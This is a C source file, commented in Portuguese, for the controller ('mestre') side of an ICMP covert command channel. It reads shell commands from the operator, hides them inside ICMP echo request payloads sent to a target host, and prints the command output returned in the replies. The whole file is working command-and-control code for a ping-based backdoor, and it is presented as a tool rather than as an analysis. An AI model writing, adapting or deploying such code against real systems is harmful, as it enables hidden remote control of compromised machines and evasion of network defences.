#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/time.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netdb.h>

// ICMP EXEC - MESTRE

// Limite de tempo que o socket deve esperar por respostas
#define TEMPO_LIMITE 5

struct pacote{
	struct icmphdr hdr;
	char msg[200];
}packet;
struct icmphdr *icmp;
struct iphdr *iph;
struct sockaddr_in dst_addr , src_addr;
struct timeval timeout;
struct hostent *host;

int icmp_cc(char *ip);
unsigned short checksum(void *b, int len);

int main(int argc , char *argv[])
{
	if(argc != 2)
	{
		fprintf(stderr , "Use: %s [ALVO].\n",argv[0]);
		return 1;
	}

	host = gethostbyname(argv[1]);
	if(host == NULL)
	{
		fprintf(stderr , "%s" , "> [ERRO]: Erro ao resolver host.\n");
		return 1;
	}

	int status = icmp_cc(inet_ntoa(*((struct in_addr*)host->h_addr)));
	if(status == -1)
	{
		fputs("> [ERRO]: Erro ao criar socket.\n",stderr);
		return 1;
	}

	return 0;
}

// Checksum do protocolo icmp
unsigned short checksum(void *b, int len) 
{    unsigned short *buf = b; 
    unsigned int sum=0; 
    unsigned short result; 
  
    for ( sum = 0; len > 1; len -= 2 ) 
        sum += *buf++; 
    if ( len == 1 ) 
        sum += *(unsigned char*)buf; 
    sum = (sum >> 16) + (sum & 0xFFFF); 
    sum += (sum >> 16); 
    result = ~sum; 
    return result; 
}

// Envia comandos para o servidor
int icmp_cc(char *ip)
{
	int bytes_enviados , bytes_recebidos , tamanho_addr = sizeof(struct sockaddr_in) , ttl_val = 64;
	char buf[30] , buffer[1024] , *pay;
	int i = 1;

	// Tempo maximo para aguardar resposta
	timeout.tv_sec = TEMPO_LIMITE;
	timeout.tv_usec = 0;

	// Cria o socket 
	int sock = socket(AF_INET , SOCK_RAW , IPPROTO_ICMP);
	if(sock == -1) return -1;

	// Destino do pacote
	dst_addr.sin_family = AF_INET;
	dst_addr.sin_addr.s_addr = inet_addr(ip);

	// Setando ttl e tempo de espera de cada resposta
	setsockopt(sock , SOL_IP , IP_TTL , &ttl_val , sizeof(ttl_val));
	setsockopt(sock , SOL_SOCKET , SO_RCVTIMEO , (const char*)&timeout , sizeof(timeout));

	printf("> ICMP MESTRE - Mestre\n");
	printf("> Iniciando...\n");

	while(1)
	{
		bzero(&packet , sizeof (packet));

		// Payload
		for(int k = 0; k < sizeof(packet.msg);++k) packet.msg[k] = '\0';
		printf("$ ") , fgets(buf , sizeof(buf) , stdin);
		memcpy(packet.msg , buf , strlen(buf));

		// Cabeçalho icmp
		packet.hdr.type = ICMP_ECHO;
		packet.hdr.code = 0;
		packet.hdr.un.echo.id = getpid();
		packet.hdr.un.echo.sequence = i;
		packet.hdr.checksum = checksum(&packet , sizeof(packet));

		// Envia um echo request para o alvo com o comando
		bytes_enviados = sendto(sock , &packet ,sizeof(packet) , 0 , (struct sockaddr *)&dst_addr , sizeof(dst_addr));
		if(bytes_enviados <= 0) printf("> [ERRO]: Erro ao enviar pacote\n");

		// Lendo a respota
		while((bytes_recebidos = read(sock , buffer , 1024)) > 0)
		{
        	if(bytes_recebidos > 0)
        	{
            	iph = (struct iphdr *)buffer;
           	 	if(bytes_recebidos > sizeof(struct iphdr))
            	{
                	bytes_recebidos -= sizeof(struct iphdr);
                	icmp = (struct icmphdr *) (iph + 1);
                	bytes_recebidos -= sizeof(struct icmphdr);
                	pay = (char *)(icmp + 1);
                	pay[bytes_recebidos] = '\0';
                	printf("%s", pay);
            	}               
         
        	}else printf("> Nenhum pacote recebido.\n");
        }

		bytes_recebidos = 0;
		bytes_enviados = 0;
		++i;
	}

	close(sock);
	return 0;

}